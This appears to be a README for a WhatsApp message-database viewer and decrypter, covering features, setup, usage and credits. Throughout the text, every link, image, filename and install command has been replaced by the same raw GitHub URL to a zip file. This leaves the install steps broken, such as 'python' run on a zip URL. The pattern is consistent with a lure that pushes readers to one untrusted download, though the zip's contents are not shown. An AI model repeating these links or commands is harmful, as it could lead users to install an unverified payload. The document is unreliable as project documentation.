# whatsapp Msgstore Viewer
Free, open source and cross-platform app to decrypt, read and view the Whatsapp `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` database.
<br/>
<p align="center">
  <img src="https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip">
</p>

# Features
* View contact and group chats. 
* View call logs with their durations.
* Easy access to media files (images, audios and videos) from inside the chat, if the local Whatsapp directory has been provided. 
* Decrypt and view the database if you have the decryption `key` (Should support **crypt12**, **crypt14** and **crypt15**).
* Cross-platform (Should work on Linux, Windows and Mac)


# Installation
* ### Download pre-built binaries
Pre-built binaries are available on the releases page. 
(Soon) 
* ### From source
  * Ensure `Python` (version 3.9 or higher) is installed (Or better yet create and activate a virtual environment).
  * Clone the repository
  ```bash 
  git clone https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip 
  ```
  * Install the requirements
  ```bash 
  pip install -r https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip
  ```
  * Run the main script
  ```bash 
  python https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip 
  ```

# Usage
To use the app, you will need:
* The `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` (`https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` if it is encrypted) database: It is a database where Whatsapp is storing all your messages.
* The `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` database: It is a database where Whatsapp is storing contact names. It is optional, so if it is not provided you will just see phone numbers.
* The `Whatsapp directory`: The directory of Whatsapp in the local storage of your phone. This will be used to view the media files (Optional as well).
* The `key`: If your database is encrypted, you will need to provide the decryption key to decrypt it first. The decrypted database will be stored in the same directory of your encrypted database suffixed with `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip`
  (See bellow for more information).

# Notes
* #### Where to find the databases
Check the great tutorial "[Retrieving WhatsApp Databases](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip)" made by [@Dexter2389](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip).

* #### About the decryption process
The app is using the [WhatsApp-Crypt14-Crypt15-Decrypter](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) by [ElDavoo](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) under the hood.
Please check their repository if you face any issues with the decryption. 
* #### About the Database schema
Because this app is only a reverse engineering attempt of the Whatsapp database, it is very likely that it might break
in case there have been any updates to the `msgstore` database.
<br/>
For now it supports just the schema of my personal `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` file.
<br/>
So I made it easy to allow the community to add support to more schemas (It's a simple SQLite exercise :D).
<br/>
All contributions are welcome. Feel free to let me know if you need any help.
<br/>
Follow these steps in order to add support to other schemas (see `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` as an example):
* Create a package in the `dbs` package and give your schema a name (for example `v2`).
* Inside the newly created package, create a python module `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip`.
* Inherit the abstract class `AbstractDatabase` located in the `https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip` module.
* The app will dynamically load existing schemas when starting. 
* Submit a pull request. 

* #### About different languages

  - You might face an issue where the messages are being displayed in a wierd way (square characters).
  This is probably a font issue. To fix that, search for a font that supports your language, and on the login screen, go to
  `advanced settings` and provide the path to your font.
  - For RTL languages, please see [RTL Support #8](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip)

# Contributing
If you find a bug, have a suggestion or feedback, please open an issue for discussion.

# Credits

- [kivy](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) & [KivyMD](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) for the UI framework.
- [WhatsApp-Redesign](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) for the design inspiration and some UI components.
- [WhatsApp-Crypt14-Crypt15-Decrypter](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) for the decryption algorithm.
- [Sbk2605](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) for the Whatsapp logo (Licenced under [Creative Commons Attribution-Share Alike 4.0 International](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip)).
- [whatsapp-chat-parser-website](https://raw.githubusercontent.com/AHAWSX/whatsapp-msgstore-viewer/main/augmentatively/whatsapp-msgstore-viewer.zip) for the background image.
<br/>
And so many more libraries and frameworks.


# License

This project is licensed under the GNU General Licence version 3 or later. You can modify or redistribute it under the conditions
of these licences (See [LICENSE](./LICENSE) for more information).

# DISCLAIMER
This project is not endorsed or certified by WhatsApp Inc. and is meant for **personal and educational purposes only**.
<br/>
It is provided as is without any express or implied warranties.<br>
The authors/maintainers/contributors assume no responsibility for errors or omissions, or for damages resulting from the use of the information contained herein.<br>




